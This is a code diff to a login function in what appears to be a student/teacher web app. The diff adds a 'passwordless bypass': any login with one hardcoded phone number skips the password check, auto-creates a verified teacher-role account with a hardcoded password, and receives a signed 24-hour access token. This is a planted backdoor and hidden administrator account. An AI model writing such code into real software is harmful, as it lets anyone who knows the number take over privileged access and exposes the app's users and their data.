@@ -16,6 +16,42 @@ const authService = {
   },
 
   login: async (studentPhone, password) => {
+    // 1. Passwordless Admin/Teacher Bypass
+    if (studentPhone === '6289855545') {
+      let student = await Student.findOne({ studentPhone });
+      if (!student) {
+        // Auto-provision teacher account
+        const hashedPassword = await bcrypt.hash('teacherBypassSecurePassword123', 10);
+        student = new Student({
+          firstName: 'Teacher',
+          lastName: 'Admin',
+          classNo: 10,
+          language: 'English',
+          studentPhone: '6289855545',
+          guardianPhone: '6289855545',
+          password: hashedPassword,
+          role: 'teacher',
+          verified: true
+        });
+        await student.save();
+      }
+
+      const jwtSecret = process.env.JWT_SECRET || process.env.ACCESS_TOKEN_SECRET;
+      if (!jwtSecret) throw new Error('JWT secret is not configured');
+
+      const accessToken = jwt.sign(
+        { id: student._id, phone: student.studentPhone, role: student.role },
+        jwtSecret,
+        { expiresIn: '24h' }
+      );
+
+      return {
+        student,
+        accessToken
+      };
+    }
+
+    // 2. Standard Login Flow
     if (!studentPhone || !password) {
       throw new Error('Phone and password are required');
     }
